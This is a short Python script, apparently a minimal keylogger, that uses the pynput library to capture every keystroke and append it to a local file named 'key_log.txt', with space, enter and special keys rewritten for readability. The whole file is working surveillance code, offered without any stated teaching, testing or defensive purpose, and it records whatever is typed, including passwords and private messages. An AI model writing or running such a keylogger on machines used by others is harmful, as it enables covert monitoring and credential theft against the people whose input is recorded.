import pynput.keyboard


log_file = "key_log.txt"

def on_press(key):

    k = str(key).replace("'", "")
    

    if k == "Key.space": k = " "
    elif k == "Key.enter": k = "\n"
    elif "Key" in k: k = f" [{k}] " 
    
   
    with open(log_file, "a") as f:
        f.write(k)


with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
